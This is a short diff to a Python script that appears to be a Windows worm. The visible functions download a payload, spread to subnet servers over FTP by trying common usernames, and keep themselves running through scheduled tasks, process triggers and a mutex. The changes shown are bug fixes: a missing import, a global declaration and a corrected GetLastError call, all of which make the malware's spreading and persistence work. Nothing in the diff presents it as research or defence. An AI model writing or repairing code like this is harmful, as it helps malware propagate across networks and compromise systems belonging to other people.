@@ -10,6 +10,7 @@ import urllib3
 import ftplib
 import wmi
 import win32event
+import win32api
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -35,6 +36,7 @@ def download_payload():
 
 # FTP propagation to subnet servers
 def ftp_spread():
+    global PAYLOAD_PATH
     try:
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
         common_users = [
@@ -255,7 +257,7 @@ def persist_process_trigger():
 def persist_mutex():
     try:
         mutex = win32event.CreateMutex(None, False, 'Global\\FTPServerMutex')
-        if win32event.GetLastError() == 0:
+        if win32api.GetLastError() == 0:
             persist_schtasks()
             persist_process_trigger()
     except:
